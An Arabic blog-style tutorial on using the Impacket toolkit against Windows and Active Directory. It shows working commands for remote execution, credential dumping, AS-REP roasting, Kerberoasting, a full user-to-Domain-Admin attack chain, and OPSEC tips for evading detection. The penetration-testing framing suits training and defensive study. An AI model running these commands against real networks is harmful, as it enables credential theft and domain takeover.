---
layout: blog
title: "Impacket: السكاكين السويسرية للـ Red Team في هجمات Windows و Active Directory"
date: 2026-04-01T05:09:31Z
category: "أداة"
excerpt: "في كل عملية Red Team ناجحة، تجد Impacket حاضرة. هذه المكتبة البرمجية ليست مجرد أداة، بل نظام بيئي متكامل لاستغلال بروتوكولات Windows. من الحصول على credentials إلى الـ lateral movement، Impacket تقدم أدوات قوية مكتوبة بـ Python لاختبار أمان Active Directory بفعالية."
read_time: 8
tags: ["Impacket", "Red Team", "Active Directory", "Penetration Testing", "Python"]
slug: "impacket-guide"
image: "/OffsecAR/assets/images/blogs/impacket-guide.png"
---

## لماذا Impacket؟

عندما تتحدث مع محترفي Offensive Security، ستجد Impacket في قائمة أدواتهم الأساسية. السبب بسيط: تمنحك وصولاً مباشراً لبروتوكولات Windows الحرجة دون الحاجة لتثبيت أدوات Windows الأصلية.

Impacket مكتبة Python توفر تطبيقات جاهزة لبروتوكولات مثل SMB، MSRPC، LDAP، و Kerberos. كتبها Core Security، وأصبحت المعيار الفعلي لأي عملية penetration testing على بيئات Windows.

الميزة الحقيقية؟ تعمل من Linux مباشرة. لا حاجة لـ Windows VM أو PowerShell remoting. فقط Python وفهم جيد لبنية Active Directory.

## الأدوات الأساسية وحالات الاستخدام

### psexec.py: التنفيذ البعيد الكلاسيكي

أداة psexec الأصلية من Sysinternals معروفة، لكن نسخة Impacket أقوى وأكثر مرونة:

```bash
# باستخدام credentials صريحة
psexec.py DOMAIN/user:password@10.10.10.50

# باستخدام Pass-the-Hash
psexec.py -hashes :NTHASH administrator@10.10.10.50

# عبر Kerberos ticket
psexec.py -k -no-pass administrator@DC01.domain.local
```

تستخدم psexec.py الـ Service Control Manager لتشغيل أوامر. البديل الأخف؟ wmiexec.py الذي يعمل عبر WMI دون كتابة ملفات على الـ disk.

### secretsdump.py: استخراج الـ Credentials

الأداة الأهم في عمليات Post-Exploitation. تستخرج hashes من SAM، LSA secrets، وحتى NTDS.dit من Domain Controllers:

```bash
# استخراج من جهاز محلي
secretsdump.py DOMAIN/user:password@10.10.10.50

# استخراج NTDS.dit من Domain Controller
secretsdump.py -just-dc-ntlm DOMAIN/admin@DC01.domain.local

# استخراج كل شيء بما فيها Kerberos keys
secretsdump.py -just-dc DOMAIN/admin@DC01.domain.local
```

سترى NTLM hashes لكل مستخدم في الـ domain. هنا تبدأ عمليات Pass-the-Hash و Credential Stuffing الحقيقية.

### GetNPUsers.py: اصطياد AS-REP Roasting

بعض الحسابات لا تتطلب Kerberos pre-authentication. خطأ تكويني شائع يمكن استغلاله:

```bash
# البحث عن حسابات vulnerable بدون credentials
GetNPUsers.py DOMAIN.local/ -dc-ip 10.10.10.50 -usersfile users.txt -format hashcat

# مع credentials للاستعلام عبر LDAP
GetNPUsers.py DOMAIN.local/user:password -dc-ip 10.10.10.50 -request
```

الـ hashes الناتجة يمكن crack-ها offline باستخدام hashcat. نسبة النجاح؟ عالية جداً مع سياسات passwords ضعيفة.

### GetUserSPNs.py: Kerberoasting الفعّال

حسابات الخدمات (Service Accounts) مع SPNs هدف ثمين. تذاكر Kerberos الخاصة بها قابلة للـ crack:

```bash
# طلب TGS tickets لكل SPNs
GetUserSPNs.py DOMAIN.local/user:password -dc-ip 10.10.10.50 -request

# حفظ في صيغة hashcat مباشرة
GetUserSPNs.py DOMAIN.local/user:password -dc-ip 10.10.10.50 -request -outputfile kerberoast.txt
```

حسابات الخدمات غالباً تملك صلاحيات عالية و passwords قديمة. استثمار الوقت في cracking هذه التذاكر يؤتي ثماره.

## سيناريو عملي: من User إلى Domain Admin

لنفترض حصولك على credentials لمستخدم عادي:

```bash
# 1. Enumeration: البحث عن SPNs
GetUserSPNs.py CORP.local/jdoe:Password123 -dc-ip 192.168.1.10 -request

# 2. Crack service account hash
hashcat -m 13100 service.hash rockyou.txt

# 3. استخدام الحساب الجديد للحصول على secretsdump
secretsdump.py CORP.local/svc_sql:CrackedPass@192.168.1.10

# 4. Pass-the-Hash للـ Administrator
psexec.py -hashes :ADMINHASH administrator@192.168.1.10
```

هذا المسار يحدث في عمليات حقيقية باستمرار. Impacket تسهّل كل خطوة.

## نصائح OPSEC وتجنب الكشف

استخدام Impacket يترك آثاراً. بعض الممارسات لتقليل البصمة:

- **استخدم wmiexec.py بدلاً من psexec.py**: لا يكتب ملفات executable على الـ disk
- **حذّر من Event IDs**: 4624 (Logon)، 4672 (Special Privileges)، و 5145 (Network Share Access)
- **استخدم Kerberos بدلاً من NTLM** عندما ممكن: `export KRB5CCNAME=ticket.ccache`
- **Rotate IPs والتوقيت**: لا تستخدم نفس الـ source باستمرار

الـ EDR الحديثة تراقب SMB lateral movement بشكل مكثف. التنويع في التكتيكات ضروري.

## الخلاصة

Impacket ليست أداة واحدة، بل مجموعة أدوات متكاملة تغطي Attack Surface كامل لبيئات Windows. من Enumeration إلى Exploitation والـ Persistence، ستجد ما تحتاجه.

الفهم العميق لـ Active Directory وبروتوكولاته شرط أساسي لاستخدام Impacket بفعالية. الأداة قوية، لكن المعرفة هي ما يحول commands بسيطة إلى تسلسل هجومي ناجح.

في عملك القادم، قبل أن تبحث عن exploit معقد، راجع Impacket. غالباً، misconfiguration بسيط وأداة Impacket المناسبة كافيان للوصول لهدفك.
